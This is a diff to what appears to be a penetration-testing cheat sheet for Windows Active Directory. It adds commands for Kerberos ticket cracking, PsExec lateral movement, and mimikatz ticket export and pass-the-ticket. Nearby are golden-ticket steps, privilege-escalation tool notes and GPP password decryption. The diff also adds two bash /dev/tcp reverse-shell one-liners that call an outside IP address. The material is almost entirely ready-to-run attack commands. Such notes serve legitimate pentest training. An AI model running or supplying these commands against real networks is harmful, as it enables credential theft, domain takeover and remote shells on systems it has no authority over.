@@ -306,8 +306,28 @@ Crack ticket with tgsrepcrack.py from TIM Medin `https://github.com/nidem/kerber
 
 ```
 python tgsrepcrack.py example.dict C:\Users\sec560\Desktop\1-40a10000-john.doe@svcsqlserver~dc01.sec560.local~1433-SEC560.LOCAL.kirbi
+```   
+Then connect with PSEXEC   
 ```
-##### Golden Ticket
+PsExec64.exe -accepteula -u user.local\sqlserver \\10.10.10.1 cmd.exe
+```   
+Then input cracked password   
+
+#### Pass the Ticket   
+```
+mimikatz.exe
+mimikatz # kerberos::list /export
+mimikatz # exit
+```   
+Load Ticket   
+```
+mimikatz.exe
+mimikatz # kerberos::ptt [ticketfile]
+mimikatz # exit
+
+C:\Users> psexec \\DC01 cmd.exe
+```
+#### Golden Ticket
 ```
 mimikatz.exe
 
@@ -348,7 +368,8 @@ john --format=netntlmv2 /opt/responder/logs/SMBv2-NTLMv2-SSP-YOUR_WINDOWS_IP_ADD
 
 passwords saved in `~/.john/john.pot`
 
-#### Priv Esc
+### Priv Esc   
+The tools beRoot.exe and PowerUp.ps1 will look for common issues including DLL injection, Unquoted paths with spaces, Writeable Service executables, unattended install, AlwaysInstallElevated Regestry, Autologon Creds, and Vulnerable Schtasks.
 
 ```
 beRoot.exe
@@ -379,7 +400,11 @@ findstr /S cpassword %LOGONSERVER%\sysvol\*.xml
 
 ```
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
-```
+```   
+#### Watson
+
+Is used for finding Missing KB's, Windows-exploit-suggester does this same function.   
+
 #### Web
 
 Using Tcpdump to test ping injection
@@ -388,9 +413,12 @@ Using Tcpdump to test ping injection
 sudo tcpdump -n host 10.10.10.50 and icmp
 ```
 
+Great source of info PentestMonkey.net   
 New version of dev/tcp not on pentest monkey
 ```
 /bin/bash -i > /dev/tcp/YOUR_LINUX_IP_ADDRESS/9999 0<&1 2>&1
+```   
+Old Version   
 ```
-
-
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
